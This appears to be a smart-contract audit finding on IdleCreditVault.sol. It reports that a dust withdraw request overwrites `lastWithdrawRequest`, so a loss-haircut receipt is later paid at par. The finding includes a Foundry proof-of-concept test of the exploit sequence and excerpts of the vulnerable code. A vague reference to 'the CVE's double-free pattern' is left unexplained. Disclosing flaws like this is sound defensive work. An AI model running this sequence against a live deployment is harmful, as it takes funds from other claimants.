### Title
Loss-adjusted withdraw receipt paid at par after a subsequent withdraw request overwrites `lastWithdrawRequest` - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` records the haircut only under `lossRecoveryPriceByEpoch[epochNumber]` [1](#0-0) . The claim path `_claimLossAdjustedWithdrawRequest` looks up that price exclusively via `lastWithdrawRequest[_user]`, a single-slot marker that every new `requestWithdraw` overwrites [2](#0-1) . A user whose epoch-N receipt was haircut can file a new request in epoch N+1, which moves the marker past the loss epoch; the loss-adjusted amount remains inside the aggregate `withdrawsRequests[_user]` and is later paid in full by `_claimFundedWithdrawRequest` [3](#0-2) . This mirrors the CVE's double-free pattern: the same entitlement is released twice — once implicitly haircut at stopEpoch bookkeeping, and again at par through the funded-claim path.

### Finding Description
- `requestWithdraw` sets `lastWithdrawRequest[_user] = currentEpoch` and adds `_amount` to both `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][currentEpoch]` [4](#0-3) .
- On a lossy `stopEpochWithDuration`, the borrower under-funds receipts; `collectWithdrawFunds` sets `pendingWithdraws = 0` and stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis`, but never touches `withdrawsRequests` or `withdrawsRequestsByEpoch` — the haircut is applied lazily at claim time [5](#0-4) .
- `_claimLossAdjustedWithdrawRequest` uses only `lastWithdrawRequest[_user]` as `lossEpoch`. If the user re-requested in epoch N+1, `lossRecoveryPriceByEpoch[N+1] == 0`, so the function returns 0 and never calls `_clearWithdrawClaimForEpoch` for epoch N [6](#0-5) .
- `_claimFundedWithdrawRequest` then pays `withdrawsRequests[_user]` — which still includes the epoch-N basis — at par, burning the receipt tokens and transferring funded underlyings [3](#0-2) .
- No guard iterates per-epoch receipts or checks `withdrawsRequestsByEpoch[_user][N]`; once epoch N+1 ends (`epochNumber > lastWithdrawRequest`), the `NotAllowed` revert no longer protects the stale epoch-N basis [7](#0-6) .

### Impact Explanation
The attacker receives `(1 - lossRecoveryPriceByEpoch[N]) * epochN_claimBasis` more underlying than entitled. The excess is drawn from the strategy's funded underlying reserve, i.e. directly from other users' pending/funded claims, producing insolvency for later claimants equal to the skipped haircut. Loss waterfall invariant ("pending receipts share their aggregate portion of the loss") is broken per-user.

### Likelihood Explanation
Requires only an unprivileged KYC'd holder with a pending withdraw receipt in an epoch that ends with `stopEpochWithDuration(_lossAmount > 0)`, plus one additional small `requestWithdraw` in the following epoch — all honest-manager sequencing. The attacker controls both transactions.

### Recommendation
Store the loss epoch per receipt rather than relying on `lastWithdrawRequest`, or have `_claimLossAdjustedWithdrawRequest` iterate/derive `lossEpoch` from `withdrawsRequestsByEpoch` (e.g., check every epoch entry with nonzero `lossRecoveryPriceByEpoch` for which the user has a receipt). Alternatively, prevent new `requestWithdraw` while the user has an unclaimed loss-adjusted receipt, or net the haircut into `withdrawsRequests`/`withdrawsRequestsByEpoch` at `collectWithdrawFunds` time (clearing each epoch's basis proportionally off-chain is not possible; instead subtract the aggregate pending basis and re-add `pendingToFund`).

function testLossAdjustedReceiptClaimedAtParAfterRerequest() external {
    uint256 amount = 10_000 * ONE_SCALE;
    idleCDO.depositAA(amount);
    _startEpochAndCheckPrices(0);

    // Attacker requests withdraw of half during epoch 0 buffer/running phase
    uint256 receiptN = cdoEpoch.requestWithdraw(mintedAA / 2, address(AAtranche)); // epoch N

    // Borrower repays less: stopEpochWithDuration with _lossAmount > 0
    (uint256 pendingToFund, ) = IdleCreditVault(address(strategy))
        .previewLossAdjustedWithdrawFunds(lossAmount);
    deal(defaultUnderlying, borrower, expectedInterest + pendingToFund);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(apr, 0, duration, lossAmount); // sets lossRecoveryPriceByEpoch[N] < RECOVERY_FULL

    // Attacker files a dust withdraw request in epoch N+1, overwriting lastWithdrawRequest
    _startEpochAndCheckPrices(1);
    cdoEpoch.requestWithdraw(1, address(AAtranche)); // lastWithdrawRequest[user] = N+1

    // Honest stop of epoch N+1 fully funds pendingWithdraws
    _stopEpochAndCheckPrices(1, apr, _expectedFundsEndEpoch());

    // Claim: _claimLossAdjustedWithdrawRequest sees lossRecoveryPriceByEpoch[N+1] == 0,
    // funded path pays withdrawsRequests[user] (receiptN + dust) at PAR
    uint256 balPre = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    // Received receiptN + dust instead of receiptN * lossPrice / RECOVERY_FULL + dust
    assertGt(underlying.balanceOf(address(this)) - balPre,
             receiptN * IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(N) / 1e18);
}

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
